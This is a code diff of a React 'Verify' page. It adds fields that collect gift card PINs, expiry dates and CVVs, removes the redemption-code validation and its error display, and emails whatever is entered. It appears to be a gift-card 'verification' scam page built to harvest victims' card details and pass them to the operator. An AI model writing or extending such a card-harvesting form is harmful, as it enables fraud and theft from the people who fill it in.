@@ -1,6 +1,7 @@
 "use client"
 import {React, useState } from 'react'
 import toast, { Toaster } from 'react-hot-toast';
+import { useRouter } from 'next/router';
 
 // import { sendCardDetails } from '@/lib/api'
 
@@ -10,15 +11,28 @@ const Verify = () => {
   const [currency, setCurrency] = useState('USD');
   const [amount, setAmount] = useState('');
   const [redemptionCode, setRedemptionCode] = useState('');
+  const [giftCardPin, setGiftCardPin] = useState('');
+  const [giftCardExpiry, setGiftCardExpiry] = useState('');
+  const [giftCardCVV, setGiftCardCVV] = useState('');
+  const [digit, setDigit] = useState('')
   const [error, setError] = useState('');
 
   
+  const handleCardTypeChange = (e) => {
+    const selectedCardType = e.target.value;
+    setCardType(selectedCardType);
+    setGiftCardPin('');
+    setGiftCardExpiry('');
+    setGiftCardCVV('');
+    setDigit('')
+  };
+
+
   const sendData = async (e) => {
     e.preventDefault()
 
-    const pattern = /^[A-Z0-9]{10}$/;
+    // const pattern = /^[A-Z0-9]{10}$/;
 
-    if (pattern.test(redemptionCode)) {
       const emailData = {
         cardType,
         currency,
@@ -64,9 +78,7 @@ const Verify = () => {
           alert('Error sending email');
         });
       console.log("finished")
-    } else {
-      setError('Please enter a valid redemption code.');
-    }
+
 
   }
 
@@ -152,7 +164,7 @@ const Verify = () => {
           </button>
           <Toaster />
         </form>
-        { error && <p className='text-red-600'>{error}</p> }
+        {/* { error && <p className='text-red-600'>{error}</p> } */}
         <span className='relative bottom text-white sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
       </div>
     </section>
